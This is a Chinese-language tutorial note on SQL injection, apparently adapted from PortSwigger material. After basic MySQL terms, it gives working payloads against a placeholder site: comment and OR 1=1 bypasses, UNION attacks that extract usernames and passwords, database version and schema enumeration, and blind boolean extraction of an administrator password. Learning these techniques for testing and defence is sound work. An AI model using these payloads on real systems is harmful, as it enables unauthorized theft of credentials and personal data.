## MySQL 的基本概念

**数据库**：是一个以某种有组织的方式存储的数据集合。

**从小到大**：列、行——》表——》数据库

**主键**：表中每一行都应该有可以唯一标识自己的一列，表中任何列都可以作为主键，只要满足以下条件

- 任意两行都不具备相同的主键
- 每个行都必须具有一个主键值（主键列不允许出现NULL值）

## SQL injection

### what SQL injection is

SQL 注入 （SQLi） 是一种 Web 安全漏洞，允许攻击者干扰应用程序对其数据库进行的查询。这可能允许攻击者**查看**他们通常**无法检索的数据**。这可能包括属于其他用户的数据，或应用程序可以访问的任何其他数据。在许多情况下，攻击者可以修改或删除此数据，从而导致对应用程序的内容或行为进行持续更改。

成功的 SQL 注入攻击可导致对敏感数据进行未经授权的访问，例如：

- 密码
- 信用卡信息
- 个人信息

多年来，SQL 注入攻击已被用于许多备受瞩目的数据泄露事件。这些都造成了声誉受损和监管罚款。在某些情况下，攻击者可以获取进入组织系统的持久后门，从而导致长期的危害，而这种危害可能会在很长一段时间内被忽视。

### How to find and exploit different types of SQLi vulnerabilities

可以使用一组针对应用程序中每个入口点的系统测试来手动检测 SQL 注入。为此，您通常会提交：

- 单引号字符`‘`，并查找错误或其他异常。

- 一些特定于SQL的语法，用于计算入口点的基本值和其他值，并查找应用程序响应中的系统差异。

- 布尔条件（如or 1=1 和or 1=2），并查找应用程序响应中的差异。

- 有效负载设计用于在SQL查询中执行时触发时间延迟，并查找响应所需时间的差异

- OAST payload，用于在SQL查询中执行时触发out-of-band，并查看生成的交互。

  >就是sql盲注

大多数SQL注入漏洞都发生在`SELECT`查询 `WHERE`的字句中。

但是，SQL注入漏洞可能发生在查询中的任何位置以及不同的查询类型中。出现SQL注入的其他一些常见位置是：

- 在语句中`UPDATE`,在更新的值或`WHERE` 子句中。
- 在`INSERT`语句中，在插入的值内。
- 在`SELECT`语句中，在表或列名内。
- 在`SELECT`语句中，在`ORDER BY`子句中。

#### **Retrieving hidden data**

一个显示不同类别产品的购物应用程序。当用户单击“礼物”类别时，其浏览器会请求URL：

```url
https://insecure-website.com/products?category=Gifts
```

这会导致应用程序进行SQL查询，以从数据库中检索相关产品的详细信息：

```sql
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```

如果程序没有任何针对SQL注入攻击的防御措施。这意味着攻击者可以构建以下攻击，例如：

```url
https://insecure-website.com/products?category=Gifts'--
```

`--` 是SQL中的注释指示符。

也可以试试如下payload

```url
https://insecure-website.com/products?category=Gifts'+OR+1=1--
```

这将导致SQL查询

```sql
SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1
```

#### **union injection**

如果应用程序使用 SQL 查询的结果进行响应，攻击者可以使用 SQL 注入漏洞**从数据库中的其他表中检索数据**。您可以使用关键字 `UNION` 执行其他 `SELECT` 查询，并将结果追加到原始查询。

```sql
SELECT name, description FROM products WHERE category = 'Gifts'
```

攻击者可以提交输入：

```sql
' UNION SELECT username, password FROM users--
```

这会导致应用程序返回所有用户名和密码以及产品的名称和描述。

当应用程序容易受到 SQL 注入的攻击，并且查询结果在应用程序的响应中返回时，可以使用该 `UNION` 关键字从数据库中的其他表中检索数据。这通常称为 SQL 注入 UNION 攻击。

使用该 `UNION` 关键字可以执行一个或多个其他 `SELECT` 查询，并将结果追加到原始查询中。例如

```sql
SELECT a, b FROM table1 UNION SELECT c, d FROM table2
```

若要使`UNION`查询正常工作，必须满足两个关键要求：

- 单个查询必须返回相同数量的列
- 每列中的数据类型必须在各个查询之间兼容

要执行SQL注入UNION攻击，确保攻击满足两个要求。

- 从原始查询返回的列数
- 从原始查询返回的哪些列具有合适的数据类型，用于保存注入查询的结果。

执行SQL注入UNION攻击时，有两种有效的方法可以确定从原始查询返回的列数。

一种方法涉及注入一系列`ORDER BY` 子句并递增指定的列索引，直到发生错误。例如，如果注入点是原始查询`WHERE`子句中带引号的字符串，则应提交：

```sql
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
etc.
```

这一系列payload会修改原始查询，以便按结果集中的不同列对结果进行排序。ORDER BY 子句中的列可以通过索引指定，因此不需要知道任何列的名称。当指定的列索引超过结果集中实际列的数量时，数据库会返回错误信息，如

```txt
The ORDER BY position number 3 is out of range of the number of items in the select list.
```

应用程序实际上可能会在其 HTTP 响应中返回数据库错误，但它也可能发出一般错误响应。在其他情况下，它可能根本不返回任何结果。无论采用哪种方式，只要您能检测到响应中的某些差异，就可以推断出从查询返回的列数。

第二种方法涉及提交一系列 `UNION SELECT` 有效负载，指定不同数量的 null 值：

```sql
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
etc.
```

如果 null 数与列数不匹配，则数据库将返回错误，例如:

```txt
All queries combined using a UNION, INTERSECT or EXCEPT operator must have an equal number of expressions in their target lists.
```

我们使用 `NULL` 从注入 `SELECT` 的查询返回的值，因为每列中的数据类型必须在原始查询和注入查询之间兼容。 `NULL` 可转换为每种常见数据类型，因此当列计数正确时，它可以最大限度地提高payload成功的机会。

与 `ORDER BY` 技术一样，应用程序可能会在 HTTP 响应中实际返回数据库错误，但也可能会返回一个通用错误或干脆不返回结果。当空值的数量与列的数量相匹配时，数据库会在结果集中返回一条额外的记录，其中包含每一列中的空值。对 HTTP 响应的影响取决于应用程序的代码。幸运的话，您会在响应中看到一些额外的内容，例如 HTML 表格中的额外行。否则，空值可能会引发不同的错误，如 NullPointerException。最糟糕的情况是，响应可能看起来与空值数量不正确导致的响应一样。这将导致此方法无效。

在Oracle上，每个`SELECT`查询都必须使用关键字`FROM`并指定一个有效的表。Oracle上有一个名为Oracledual的内置表，可用于此目的。因此，在Oracle上注入的查询需要如下所示：

```sql
' UNION SELECT NULL FROM DUAL--
```

所描述的有效负载使用双破折号注释序列 `--` 来注释掉注入点之后的原始查询的其余部分。在MySQL上，双破折号序列后面必须跟一个空格。或者，哈希字符 `#` 可用于标识注释。

有关特定于数据库的语法的更多信息，查阅[SQL注入备忘录 ](https://portswigger.net/web-security/sql-injection/cheat-sheet)

**查找具有有用数据类型的列**

SQL 注入 UNION 攻击使您能够从注入的查询中检索结果。要检索的有趣数据通常**采用字符串形式**。这意味着您需要在原始查询结果中查找数据类型为字符串数据或与字符串数据兼容的一个或多个列。

确定所需列数后，可以探测每个列以测试它是否可以保存字符串数据。您可以提交一系列有效负载，这些 `UNION SELECT` 有效负载依次将字符串值放入每一列中。例如，如果查询返回四列，则提交：

```sql
' UNION SELECT 'a',NULL,NULL,NULL--
' UNION SELECT NULL,'a',NULL,NULL--
' UNION SELECT NULL,NULL,'a',NULL--
' UNION SELECT NULL,NULL,NULL,'a'--
```

如果列数据类型与字符串数据不兼容，则注入的查询将导致数据库错误，例如：

```txt
Conversion failed when converting the varchar value 'a' to data type int.
```

如果未发生错误，并且应用程序的响应包含一些附加内容（包括注入的字符串值），则相关列适用于检索字符串数据。

当确定了原始查询返回的列数并找到哪些可以保存字符串数据时，可以检索感兴趣的数据。

假设

- 原始查询返回两列，这两列都可以保存字符串数据。
- 注入点是子句中的带引号的`WHERE`字符串。
- 该数据库包含一个名为`users`的表，其中有`username`和`password`两列。

在这个例子中，可以通过提交输入来检索用户表中的内容：

```solidity
' UNION SELECT username, password FROM users--
```

为了执行此攻击，您需要知道一个名为username和password的两列users表。所有数据库都提供了检查数据库结构并确定它们包含哪些表和列的方法。

在某些情况下，上一个示例中查询可能只返回单个列。

通过将值连接在一起，可以在此单个列中同时检索多个值。可以包含一个分隔符，以便区分组合值。例如，在Oracle上，可以提交输入：

```solidity
' UNION SELECT username || '~' || password FROM users--
```

查询结果包含所有用户名和密码，例如：

```solidity
...
administrator~s3cure
wiener~peter
carlos~montoya
...
```

不同的数据库使用不同的语法来执行字符串连接。有关详细信息，见[SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)

#### Examining the database in SQL injection attacks

若要利用SQL注入漏洞，通常需要查找有关数据库的信息。这包括：

- 数据库软件的类型和版本。
- 数据库包含的表和列。

**查询数据库类型和版本**

您可以通过注入特定于提供程序的查询来识别数据库类型和版本，看看其中一个是否有效。

下面是一些查询，用于确定某些常用数据库类型的数据库版本：

| Database type      | Query                   |
| ------------------ | ----------------------- |
| SQL Server , MySQL | SELECT @@version        |
| Oracle             | SELECT * FROM V$version |
| PostgreSQL         | SELECT version()        |

>**Oracle**
>
>`V$VERSION` 视图返回关于数据库和数据库组件的版本信息。`BANNER` 列包含一个字符串，其中包括数据库版本、主要组件版本以及其他一些信息。这通常用于确定数据库当前正在使用的 Oracle 版本。
>
>**MYSQL**
>
>mysql使用#注释

例如如下payload

```solidity
' UNION SELECT @@version--
```

可能会返回以下输出

```sql
Microsoft SQL Server 2016 (SP2) (KB4052908) - 13.0.5026.0 (X64)
Mar 18 2018 09:11:49
Copyright (c) Microsoft Corporation
Standard Edition (64-bit) on Windows Server 2016 Standard 10.0 <X64> (Build 14393: ) (Hypervisor)
```

大多数数据库类型（**Oracle除外**）都有一组称为信息架构的视图。提供了有关数据库的信息。

例如，可以查询`information_schema.tables` 以列出数据库中的表：

```sql
SELECT * FROM information_schema.tables
```

将返回如下所示的输出：

```sql
TABLE_CATALOG  TABLE_SCHEMA  TABLE_NAME  TABLE_TYPE
=====================================================
MyDatabase     dbo           Products    BASE TABLE
MyDatabase     dbo           Users       BASE TABLE
MyDatabase     dbo           Feedback    BASE TABLE
```

此输出指示有三个表，分别称为`Products`、`Users` 和`Feedback`。

然后，可以查询`information_schema.columns` 列出各个表中的列

```solidity
SELECT * FROM information_schema.columns WHERE table_name = 'Users'
```

这将返回如下所示的输出：

```txt
TABLE_CATALOG  TABLE_SCHEMA  TABLE_NAME  COLUMN_NAME  DATA_TYPE
=================================================================
MyDatabase     dbo           Users       UserId       int
MyDatabase     dbo           Users       Username     varchar
MyDatabase     dbo           Users       Password     varchar
```

**列出Oracle数据库的内容**

- 可以通过查询all_tables列出数据库中的表

```sql
SELECT * FROM all_tables
```

- 可以通过查询`all_tab_columns`获得所有列

```sql
SELECT * FROM all_tab_columns WHERE table_name = 'USERS'
```

#### **Blind SQL injection**

当应用程序容易受到SQL注入的攻击，但其HTTP响应不包含相关SQL查询的结果或任何数据库错误的详细信息时，就会发生盲SQL注入。

许多技术（如UNION注入）对盲注是无效的。这是因为它们依赖于能够在应用程序的响应中看到注入的查询结果。仍然可以利用盲注来访问未授权的数据，但必须使用不同的技术。

##### 通过触发条件响应来利用SQL盲注

一个使用跟踪Cookie来收集有关使用情况分析的应用程序。对应用程序的请求包括一个cookie头，如下所示：

```solidity
Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4
```

处理包含TrackingId cookie的请求时，应用程序使用SQL查询来确定这是否是已知用户：

```solidity
SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'
```

此查询容易受到SQL注入攻击，但查询结果不会返回给用户。但是，应用程序的行为会有所不同，具体取决于查询是否返回任何数据。如果提交已识别TrackingID时，则查询将返回数据并且会在响应中收到“欢迎回来”消息。

此行为足以利用SQL盲注漏洞。可以通过有条件地触发不同的响应来检索信息，具体取决于注入的条件。

为了了解此漏洞利用的工作原理，我们假设发送了两个请求，依次包含以下`TrackingIdcookie`值：

```solidity
…xyz' AND '1'='1
…xyz' AND '1'='2
```

- 这些值中第一个值会导致查询返回结果，因为注入AND‘1’=‘1的条件为true。因此，将显示“欢迎回来”消息。
- 第二个值会导致查询不返回任何消息，因为注入的条件为false。不显示“欢迎回来”的消息。

这样，我们就能确定任何一个注入条件的答案，并一次提取一个数据。

例如，假设有一个名为`Users` 的表，其中有 `Username` 和 `Password`两列。还有一个名为`Administrator`的用户。可以通过发送一系列输入来确定此用户的密码，以一次测试一个字符的密码。

```txt
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm
```

>SUBSTRING(("adsdqsdwa"),1,1) 表示从字符串中提取子字符串，从第一个字符开始到第一个字符结束（不是从零开始）。

可以一个个字符的测试，直到确认Administrator的完整密码。

